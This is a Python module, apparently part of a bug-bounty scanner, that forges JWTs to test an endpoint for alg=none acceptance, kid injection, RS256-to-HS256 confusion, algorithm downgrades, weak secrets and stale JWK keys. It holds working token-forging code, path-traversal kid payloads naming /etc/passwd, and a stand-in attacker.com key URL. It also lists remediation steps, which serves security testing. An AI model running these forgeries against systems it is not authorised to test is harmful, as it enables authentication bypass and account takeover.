# -*- coding: utf-8 -*-
from typing import Dict, Any, List, Optional, Tuple
import base64
import json
import hmac
import hashlib
import time
from datetime import datetime
from urllib.parse import urljoin
from ..base.feature_base import FeatureBase
from ..base.feature_registry import FeatureRegistry
from ..base.result_schema import FeatureResult, Finding
from ..base.http_client import SafeHttp

def b64url_encode(data: bytes) -> str:
    """Base64 URL 安全編碼"""
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

def b64url_decode(data: str) -> bytes:
    """Base64 URL 安全解碼"""
    # 補齊填充字元
    padding = 4 - (len(data) % 4)
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)

# v2.5 新增：常見弱密鑰庫（智能爆破）
COMMON_JWT_SECRETS = [
    "secret", "Secret", "SECRET", "password", "Password", 
    "jwt_secret", "jwt-secret", "jwtsecret", "JWTSecret",
    "token_secret", "tokensecret", "my_secret_key",
    "changeme", "1234567890", "admin", "root", "test",
    "development", "production", "staging", "demo"
]

# v2.5 新增：算法降級鏈
ALGORITHM_DOWNGRADE_CHAIN = [
    ("RS512", ["RS256", "HS512", "HS256"]),
    ("RS384", ["RS256", "HS384", "HS256"]),
    ("RS256", ["HS256", "HS512"]),
    ("ES512", ["ES256", "HS512", "HS256"]),
    ("ES384", ["ES256", "HS384", "HS256"]),
    ("ES256", ["HS256", "HS512"]),
    ("PS512", ["PS256", "HS512", "HS256"]),
    ("PS384", ["PS256", "HS384", "HS256"]),
    ("PS256", ["HS256", "HS512"])
]

@FeatureRegistry.register
class JwtConfusionWorker(FeatureBase):
    """
    JWT 混淆攻擊檢測模組 v2.5
    
    專門檢測 JWT 實作中的常見安全漏洞，這些漏洞一旦成功利用
    通常能獲得完全的身分驗證繞過，在 Bug Bounty 平台屬於高價值目標。
    
    v2.5 新增功能：
    - JWK 輪換檢測：測試密鑰輪換窗口期的漏洞
    - 算法降級鏈：自動測試多級算法降級攻擊
    - 多階段驗證：token 生成 → 使用 → 刷新 全流程追蹤
    - 密鑰猜測優化：基於常見密鑰庫的智能爆破
    
    檢測的漏洞類型：
    1. alg=none 漏洞：接受無簽名的 JWT
    2. kid 注入：透過 kid 欄位注入本地檔案路徑或外部資源
    3. 算法混淆：RS256→HS256 等非對稱轉對稱攻擊
    4. 弱金鑰爆破：常見密鑰字典攻擊
    5. JWK 輪換漏洞：密鑰更新期間的時間窗口攻擊
    6. 算法降級鏈：多級降級組合攻擊
    
    這些漏洞的共同特點是能完全繞過身分驗證，屬於 P1/P0 級別。
    """
    
    name = "jwt_confusion"
    version = "2.5.0"
    tags = ["jwt", "jwk", "kid", "authentication-bypass", "critical"]
    
    def _test_algorithm_downgrade_chain(
        self,
        http: SafeHttp,
        validate_url: str,
        extra_headers: Dict[str, Any],
        payload_b64: str,
        original_alg: str
    ) -> List[Dict[str, Any]]:
        """
        v2.5 新增：算法降級鏈測試
        測試從高安全性算法降級到低安全性算法
        
        Returns:
            成功的降級攻擊列表
        """
        successful_downgrades = []
        
        # 找到適用的降級鏈
        for source_alg, target_algs in ALGORITHM_DOWNGRADE_CHAIN:
            if original_alg == source_alg or original_alg.startswith(source_alg[:2]):
                for target_alg in target_algs:
                    try:
                        # 構造降級的 header
                        downgrade_header = b64url_encode(json.dumps({
                            "alg": target_alg,
                            "typ": "JWT"
                        }).encode())
                        
                        # 嘗試常見密鑰
                        for secret in COMMON_JWT_SECRETS[:5]:  # 限制嘗試次數
                            try:
                                sig = b64url_encode(hmac.new(
                                    secret.encode(),
                                    f"{downgrade_header}.{payload_b64}".encode(),
                                    hashlib.sha256 if '256' in target_alg else hashlib.sha512
                                ).digest())
                                forged_token = f"{downgrade_header}.{payload_b64}.{sig}"
                                
                                ok_status, anon_status = self._validate_token_pair(
                                    http, validate_url, extra_headers, forged_token
                                )
                                
                                if ok_status == 200 and anon_status in (401, 403):
                                    successful_downgrades.append({
                                        "original_alg": original_alg,
                                        "target_alg": target_alg,
                                        "secret_used": secret,
                                        "forged_token": forged_token,
                                        "timestamp": datetime.utcnow().isoformat()
                                    })
                                    break  # 找到一個成功的就停止該算法
                            except Exception:
                                continue
                                
                    except Exception:
                        continue
        
        return successful_downgrades
    
    def _test_jwk_rotation_window(
        self,
        http: SafeHttp,
        validate_url: str,
        extra_headers: Dict[str, Any],
        token: str,
        jwks_url: Optional[str]
    ) -> Optional[Dict[str, Any]]:
        """
        v2.5 新增：JWK 輪換窗口測試
        測試密鑰輪換期間是否存在驗證漏洞
        
        Returns:
            如果發現漏洞，返回證據字典
        """
        if not jwks_url:
            return None
        
        try:
            # 1. 獲取當前 JWK Set
            jwks_resp = http.request("GET", jwks_url)
            if jwks_resp.status_code != 200:
                return None
            
            jwks_data = jwks_resp.json()
            keys = jwks_data.get("keys", [])
            
            if len(keys) < 2:
                return None  # 需要至少 2 個密鑰才能測試輪換
            
            # 2. 測試舊密鑰是否仍然有效
            old_key_ids = [k.get("kid") for k in keys[1:]]  # 假設第一個是當前密鑰
            
            for old_kid in old_key_ids:
                # 構造使用舊 kid 的 token
                parts = token.split(".")
                if len(parts) != 3:
                    continue
                
                try:
                    header = json.loads(b64url_decode(parts[0]))
                    header["kid"] = old_kid
                    
                    new_header = b64url_encode(json.dumps(header).encode())
                    test_token = f"{new_header}.{parts[1]}.{parts[2]}"
                    
                    ok_status, _ = self._validate_token_pair(
                        http, validate_url, extra_headers, test_token
                    )
                    
                    if ok_status == 200:
                        return {
                            "vulnerability": "jwk_rotation_window",
                            "old_kid_accepted": old_kid,
                            "total_keys": len(keys),
                            "timestamp": datetime.utcnow().isoformat()
                        }
                except Exception:
                    continue
            
        except Exception:
            pass
        
        return None
    
    def _test_weak_secret_bruteforce(
        self,
        http: SafeHttp,
        validate_url: str,
        extra_headers: Dict[str, Any],
        payload_b64: str,
        alg: str = "HS256"
    ) -> Optional[Dict[str, Any]]:
        """
        v2.5 新增：優化的弱密鑰爆破
        使用常見密鑰庫進行智能爆破
        
        Returns:
            如果找到弱密鑰，返回證據字典
        """
        header = b64url_encode(json.dumps({
            "alg": alg,
            "typ": "JWT"
        }).encode())
        
        for secret in COMMON_JWT_SECRETS:
            try:
                hash_func = hashlib.sha256 if '256' in alg else (
                    hashlib.sha512 if '512' in alg else hashlib.sha384
                )
                
                sig = b64url_encode(hmac.new(
                    secret.encode(),
                    f"{header}.{payload_b64}".encode(),
                    hash_func
                ).digest())
                forged_token = f"{header}.{payload_b64}.{sig}"
                
                ok_status, anon_status = self._validate_token_pair(
                    http, validate_url, extra_headers, forged_token
                )
                
                if ok_status == 200 and anon_status in (401, 403):
                    return {
                        "vulnerability": "weak_secret",
                        "algorithm": alg,
                        "secret_found": secret,
                        "forged_token": forged_token,
                        "timestamp": datetime.utcnow().isoformat()
                    }
            except Exception:
                continue
        
        return None
    
    def _build_multi_stage_evidence(
        self,
        baseline: Dict[str, Any],
        attack: Dict[str, Any],
        verification: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        v2.5 新增：多階段證據鏈構建
        構建 token 生成 → 使用 → 驗證 的完整證據鏈
        
        Returns:
            完整的證據鏈字典
        """
        return {
            "timeline": [
                {
                    "stage": "baseline",
                    "timestamp": baseline.get("timestamp"),
                    "description": "原始 token 驗證",
                    "result": baseline
                },
                {
                    "stage": "attack",
                    "timestamp": attack.get("timestamp"),
                    "description": "偽造 token 生成",
                    "result": attack
                },
                {
                    "stage": "verification",
                    "timestamp": verification.get("timestamp"),
                    "description": "偽造 token 驗證",
                    "result": verification
                }
            ],
            "attack_duration_ms": self._calculate_duration(
                baseline.get("timestamp", ""),
                verification.get("timestamp", "")
            )
        }
    
    def _calculate_duration(self, start_iso: str, end_iso: str) -> float:
        """計算時間差（毫秒）"""
        try:
            start = datetime.fromisoformat(start_iso)
            end = datetime.fromisoformat(end_iso)
            return (end - start).total_seconds() * 1000
        except:
            return 0.0

    def run(self, params: Dict[str, Any]) -> FeatureResult:
        """
        執行 JWT 混淆攻擊檢測 (v2.5)
        
        Args:
            params: 檢測參數
              - target (str): 基礎 URL
              - validate_endpoint (str): 需要 JWT 驗證的端點，如 /api/me
              - victim_token (str): 合法的低權限 JWT token
              - jwks_url (str): 可選，JWK Set URL
              - attempts (dict): 攻擊類型開關
                - alg_none: 是否測試 alg=none
                - kid_injection: 是否測試 kid 注入
                - symmetric_rs: 是否測試 RS→HS 轉換
                - algorithm_downgrade: v2.5 是否測試算法降級鏈
                - jwk_rotation: v2.5 是否測試 JWK 輪換
                - weak_secret: v2.5 是否測試弱密鑰爆破
              - headers (dict): 額外的請求頭
              
        Returns:
            FeatureResult: 檢測結果
        """
        http = SafeHttp()
        base = params.get("target", "")
        validate_endpoint = params.get("validate_endpoint", "/api/me")
        validate_url = urljoin(base, validate_endpoint)
        token = (params.get("victim_token") or "").strip()
        jwks_url = params.get("jwks_url")
        attempts = params.get("attempts") or {
            "alg_none": True, 
            "kid_injection": True, 
            "symmetric_rs": True,
            "algorithm_downgrade": True,  # v2.5
            "jwk_rotation": True,  # v2.5
            "weak_secret": True  # v2.5
        }
        extra_headers = params.get("headers", {})
        
        findings: List[Finding] = []
        trace = []
        timestamps = {"start": datetime.utcnow().isoformat()}
        
        cmd = self.build_command_record(
            "jwt.confusion.v2.5", 
            "JWT 混淆攻擊檢測（增強版）", 
            {
                "validate_endpoint": validate_endpoint,
                "attacks": list(attempts.keys()),
                "has_jwks": bool(jwks_url),
                "v2.5_features": ["algorithm_downgrade", "jwk_rotation", "weak_secret"]
            }
        )
        
        if not token:
            return FeatureResult(
                False, self.name, cmd, [], 
                {"error": "缺少 victim_token 參數", "trace": trace}
            )
        
        # 解析原始 token
        try:
            header_b64, payload_b64, sig_b64 = token.split(".")
            header = json.loads(b64url_decode(header_b64))
            payload = json.loads(b64url_decode(payload_b64))
            original_alg = header.get("alg", "")
        except Exception as e:
            return FeatureResult(
                False, self.name, cmd, [], 
                {"error": f"無效的 JWT 格式: {e}", "trace": trace}
            )
        
        # v2.5 驗證原始 token 是否有效（建立基線）
        timestamps["baseline"] = datetime.utcnow().isoformat()
        try:
            baseline_resp = http.request(
                "GET", validate_url, 
                headers={**extra_headers, "Authorization": f"Bearer {token}"}
            )
            trace.append({
                "step": "baseline_validation",
                "status": baseline_resp.status_code,
                "token_valid": baseline_resp.status_code == 200,
                "timestamp": timestamps["baseline"]
            })
        except Exception as e:
            trace.append({"step": "baseline_error", "error": str(e), "timestamp": timestamps["baseline"]})
            baseline_resp = None
        
        # 1) alg=none 攻擊
        if attempts.get("alg_none"):
            try:
                none_header = b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
                forged_token = f"{none_header}.{payload_b64}."
                
                ok_status, anon_status = self._validate_token_pair(
                    http, validate_url, extra_headers, forged_token
                )
                
                trace.append({
                    "step": "alg_none_test",
                    "authenticated_status": ok_status,
                    "anonymous_status": anon_status
                })
                
                if ok_status == 200 and anon_status in (401, 403):
                    findings.append(Finding(
                        vuln_type="JWT alg=none Bypass",
                        severity="critical",
                        title="JWT 'none' 演算法被接受，允許無簽名驗證",
                        evidence={
                            "forged_token_sample": f"{forged_token[:80]}...",
                            "validate_status": ok_status,
                            "anonymous_status": anon_status,
                            "original_alg": header.get("alg")
                        },
                        reproduction=[
                            {
                                "step": 1,
                                "description": "構造 alg=none 的 JWT",
                                "request": {
                                    "method": "GET",
                                    "url": validate_url,
                                    "headers": {
                                        "Authorization": f"Bearer {forged_token[:80]}..."
                                    }
                                },
                                "expect": "應拒絕無簽名的 JWT"
                            }
                        ],
                        impact="完全繞過 JWT 身分驗證，攻擊者可偽造任意用戶身分",
                        recommendation="1. 嚴格拒絕 'none' 演算法\n2. 實施演算法白名單\n3. 強制要求簽名驗證\n4. 使用安全的 JWT 函式庫"
                    ))
                    
            except Exception as e:
                trace.append({"step": "alg_none_error", "error": str(e)})
        
        # 2) kid 注入攻擊
        if attempts.get("kid_injection"):
            kid_payloads = [
                "../../../../etc/passwd",
                "/dev/null", 
                "file:/etc/hostname",
                "https://attacker.com/jwk.json",
                "../../../config/secret.key"
            ]
            
            for kid in kid_payloads:
                try:
                    kid_header = b64url_encode(json.dumps({
                        "alg": "HS256", 
                        "typ": "JWT", 
                        "kid": kid
                    }).encode())
                    
                    # 嘗試不同的密鑰猜測策略
                    key_guesses = [
                        b"",  # 空密鑰
                        b"secret",  # 常見弱密鑰
                        kid.encode(),  # kid 本身作為密鑰
                        b"null\x00"  # null 字節
                    ]
                    
                    for key_guess in key_guesses:
                        try:
                            sig = b64url_encode(hmac.new(
                                key_guess, 
                                f"{kid_header}.{payload_b64}".encode(), 
                                hashlib.sha256
                            ).digest())
                            forged_token = f"{kid_header}.{payload_b64}.{sig}"
                            
                            ok_status, anon_status = self._validate_token_pair(
                                http, validate_url, extra_headers, forged_token
                            )
                            
                            trace.append({
                                "step": "kid_injection_test",
                                "kid": kid,
                                "key_guess": key_guess.decode('utf-8', errors='ignore'),
                                "authenticated_status": ok_status,
                                "anonymous_status": anon_status
                            })
                            
                            if ok_status == 200 and anon_status in (401, 403):
                                findings.append(Finding(
                                    vuln_type="JWT kid Injection",
                                    severity="critical", 
                                    title=f"JWT kid 注入成功：{kid}",
                                    evidence={
                                        "kid_payload": kid,
                                        "key_used": key_guess.decode('utf-8', errors='ignore'),
                                        "forged_token_sample": f"{forged_token[:80]}...",
                                        "validate_status": ok_status
                                    },
                                    reproduction=[
                                        {
                                            "step": 1,
                                            "description": f"構造帶有 kid={kid} 的 JWT",
                                            "request": {
                                                "method": "GET",
                                                "url": validate_url,
                                                "headers": {
                                                    "Authorization": f"Bearer {forged_token[:80]}..."
                                                }
                                            },
                                            "expect": "應拒絕或驗證失敗"
                                        }
                                    ],
                                    impact="透過 kid 欄位注入可讀取本地檔案或外部資源作為簽名密鑰，完全繞過驗證",
                                    recommendation="1. 不允許 kid 解析任意資源\n2. 使用預定義的密鑰清單\n3. 驗證 JWK 來源\n4. 實施路徑遍歷防護"
                                ))
                                break  # 找到一個成功的就停止
                                
                        except Exception:
                            continue
                            
                except Exception as e:
                    trace.append({
                        "step": "kid_injection_error", 
                        "kid": kid, 
                        "error": str(e)
                    })
        
        # 3) RS256 轉 HS256 攻擊（非對稱轉對稱）
        if attempts.get("symmetric_rs"):
            try:
                # 將演算法改為 HS256
                hs_header = b64url_encode(json.dumps({
                    "alg": "HS256", 
                    "typ": "JWT"
                }).encode())
                
                # 使用原始 header 作為 HMAC 密鑰（常見錯誤）
                guess_keys = [
                    json.dumps(header).encode(),
                    json.dumps(header, separators=(',', ':')).encode(),
                    str(header).encode()
                ]
                
                for guess_key in guess_keys:
                    try:
                        sig = b64url_encode(hmac.new(
                            guess_key,
                            f"{hs_header}.{payload_b64}".encode(),
                            hashlib.sha256
                        ).digest())
                        forged_token = f"{hs_header}.{payload_b64}.{sig}"
                        
                        ok_status, anon_status = self._validate_token_pair(
                            http, validate_url, extra_headers, forged_token
                        )
                        
                        trace.append({
                            "step": "rs_to_hs_test",
                            "key_material": guess_key.decode('utf-8', errors='ignore')[:100],
                            "authenticated_status": ok_status,
                            "anonymous_status": anon_status
                        })
                        
                        if ok_status == 200 and anon_status in (401, 403):
                            findings.append(Finding(
                                vuln_type="JWT Algorithm Confusion (RS→HS)",
                                severity="critical",
                                title="JWT RS256→HS256 演算法混淆成功",
                                evidence={
                                    "original_alg": header.get("alg"),
                                    "forged_alg": "HS256",
                                    "key_material_used": guess_key.decode('utf-8', errors='ignore')[:200],
                                    "validate_status": ok_status
                                },
                                reproduction=[
                                    {
                                        "step": 1,
                                        "description": "將 RS256 演算法改為 HS256 並用公鑰材料簽名",
                                        "request": {
                                            "method": "GET",
                                            "url": validate_url,
                                            "headers": {
                                                "Authorization": f"Bearer {forged_token[:80]}..."
                                            }
                                        },
                                        "expect": "應拒絕演算法不符的 JWT"
                                    }
                                ],
                                impact="將非對稱演算法偽裝成對稱演算法，使用公開材料作為 HMAC 密鑰完全繞過驗證",
                                recommendation="1. 嚴格綁定預期的演算法\n2. 對不同演算法使用獨立的驗證管道\n3. 不允許演算法動態切換\n4. 驗證密鑰類型與演算法的匹配"
                            ))
                            break
                            
                    except Exception:
                        continue
                        
            except Exception as e:
                trace.append({"step": "rs_to_hs_error", "error": str(e)})
        
        # v2.5 新增攻擊測試
        
        # 4) 算法降級鏈測試
        if attempts.get("algorithm_downgrade"):
            timestamps["algorithm_downgrade"] = datetime.utcnow().isoformat()
            downgrade_results = self._test_algorithm_downgrade_chain(
                http, validate_url, extra_headers, payload_b64, original_alg
            )
            
            trace.append({
                "step": "algorithm_downgrade_chain",
                "successful_downgrades": len(downgrade_results),
                "timestamp": timestamps["algorithm_downgrade"]
            })
            
            for downgrade in downgrade_results:
                findings.append(Finding(
                    vuln_type="JWT Algorithm Downgrade Chain (v2.5)",
                    severity="critical",
                    title=f"算法降級成功：{downgrade['original_alg']} → {downgrade['target_alg']}",
                    evidence={
                        "original_algorithm": downgrade["original_alg"],
                        "downgraded_to": downgrade["target_alg"],
                        "secret_used": downgrade["secret_used"],
                        "forged_token_sample": downgrade["forged_token"][:80] + "...",
                        "attack_timestamp": downgrade["timestamp"]
                    },
                    reproduction=[
                        {
                            "step": 1,
                            "description": f"將 {downgrade['original_alg']} 降級為 {downgrade['target_alg']}",
                            "request": {
                                "method": "GET",
                                "url": validate_url,
                                "headers": {
                                    "Authorization": f"Bearer {downgrade['forged_token'][:80]}..."
                                }
                            },
                            "expect": "應拒絕算法不符的 JWT"
                        }
                    ],
                    impact=f"攻擊者可將高安全性算法 {downgrade['original_alg']} 降級為低安全性的 {downgrade['target_alg']}，使用常見密鑰 '{downgrade['secret_used']}' 完全繞過驗證",
                    recommendation="1. 嚴格綁定預期的算法，不允許降級\n2. 對不同安全級別的算法使用獨立的密鑰\n3. 實施算法白名單控制\n4. 記錄並告警算法變更嘗試"
                ))
        
        # 5) JWK 輪換窗口測試
        if attempts.get("jwk_rotation") and jwks_url:
            timestamps["jwk_rotation"] = datetime.utcnow().isoformat()
            rotation_vuln = self._test_jwk_rotation_window(
                http, validate_url, extra_headers, token, jwks_url
            )
            
            trace.append({
                "step": "jwk_rotation_test",
                "vulnerability_found": bool(rotation_vuln),
                "timestamp": timestamps["jwk_rotation"]
            })
            
            if rotation_vuln:
                findings.append(Finding(
                    vuln_type="JWK Rotation Window Vulnerability (v2.5)",
                    severity="high",
                    title=f"JWK 輪換期間存在驗證漏洞",
                    evidence={
                        "old_kid_accepted": rotation_vuln["old_kid_accepted"],
                        "total_keys_in_jwks": rotation_vuln["total_keys"],
                        "attack_timestamp": rotation_vuln["timestamp"]
                    },
                    reproduction=[
                        {
                            "step": 1,
                            "description": "獲取 JWK Set",
                            "request": {
                                "method": "GET",
                                "url": jwks_url
                            },
                            "expect": "返回當前有效的密鑰集"
                        },
                        {
                            "step": 2,
                            "description": "使用舊的 kid 驗證 token",
                            "request": {
                                "method": "GET",
                                "url": validate_url,
                                "headers": {
                                    "Authorization": f"Bearer [token_with_old_kid]"
                                }
                            },
                            "expect": "應拒絕使用已輪換的舊密鑰"
                        }
                    ],
                    impact="密鑰輪換期間，舊密鑰仍然有效，攻擊者可利用已洩露的舊密鑰繼續偽造 token",
                    recommendation="1. 實施嚴格的密鑰生命週期管理\n2. 密鑰輪換後立即失效舊密鑰\n3. 使用密鑰版本控制\n4. 實施 token 吊銷機制\n5. 縮短 token 有效期"
                ))
        
        # 6) 弱密鑰爆破測試
        if attempts.get("weak_secret"):
            timestamps["weak_secret"] = datetime.utcnow().isoformat()
            weak_secret_vuln = self._test_weak_secret_bruteforce(
                http, validate_url, extra_headers, payload_b64, original_alg
            )
            
            trace.append({
                "step": "weak_secret_bruteforce",
                "vulnerability_found": bool(weak_secret_vuln),
                "timestamp": timestamps["weak_secret"]
            })
            
            if weak_secret_vuln:
                findings.append(Finding(
                    vuln_type="JWT Weak Secret (v2.5)",
                    severity="critical",
                    title=f"JWT 使用弱密鑰：{weak_secret_vuln['secret_found']}",
                    evidence={
                        "algorithm": weak_secret_vuln["algorithm"],
                        "secret_found": weak_secret_vuln["secret_found"],
                        "forged_token_sample": weak_secret_vuln["forged_token"][:80] + "...",
                        "attack_timestamp": weak_secret_vuln["timestamp"]
                    },
                    reproduction=[
                        {
                            "step": 1,
                            "description": f"使用常見密鑰 '{weak_secret_vuln['secret_found']}' 簽名 JWT",
                            "request": {
                                "method": "GET",
                                "url": validate_url,
                                "headers": {
                                    "Authorization": f"Bearer {weak_secret_vuln['forged_token'][:80]}..."
                                }
                            },
                            "expect": "應使用強密鑰，拒絕弱密鑰簽名"
                        }
                    ],
                    impact=f"JWT 使用常見弱密鑰 '{weak_secret_vuln['secret_found']}'，攻擊者可輕易暴力破解並偽造任意 token",
                    recommendation="1. 使用強隨機密鑰（至少 256 位）\n2. 定期輪換密鑰\n3. 不使用字典中的常見密鑰\n4. 使用密鑰管理服務（KMS）\n5. 實施密鑰複雜度策略"
                ))
        
        # v2.5 最終統計
        timestamps["end"] = datetime.utcnow().isoformat()
        
        return FeatureResult(
            ok=bool(findings),
            feature=self.name,
            command_record=cmd,
            findings=findings,
            meta={
                "version": "2.5.0",
                "trace": trace,
                "original_header": header,
                "original_payload": payload,
                "original_algorithm": original_alg,
                "attacks_attempted": list(attempts.keys()),
                "v2.5_attacks": {
                    "algorithm_downgrade": len([f for f in findings if "Downgrade" in f.vuln_type]),
                    "jwk_rotation": len([f for f in findings if "Rotation" in f.vuln_type]),
                    "weak_secret": len([f for f in findings if "Weak Secret" in f.vuln_type])
                },
                "timestamps": timestamps
            }
        )
    
    def _validate_token_pair(self, http: SafeHttp, url: str, headers: Dict[str, Any], 
                           token: str) -> tuple[int, int]:
        """
        驗證 token 的有效性，同時測試帶 token 和不帶 token 的情況
        
        Returns:
            (帶token的狀態碼, 不帶token的狀態碼)
        """
        try:
            # 帶 token 的請求
            auth_resp = http.request(
                "GET", url, 
                headers={**headers, "Authorization": f"Bearer {token}"}
            )
            auth_status = auth_resp.status_code
        except Exception:
            auth_status = 0
        
        try:
            # 不帶 token 的請求（匿名）
            anon_resp = http.request("GET", url, headers=headers)
            anon_status = anon_resp.status_code
        except Exception:
            anon_status = 0
        
        return auth_status, anon_status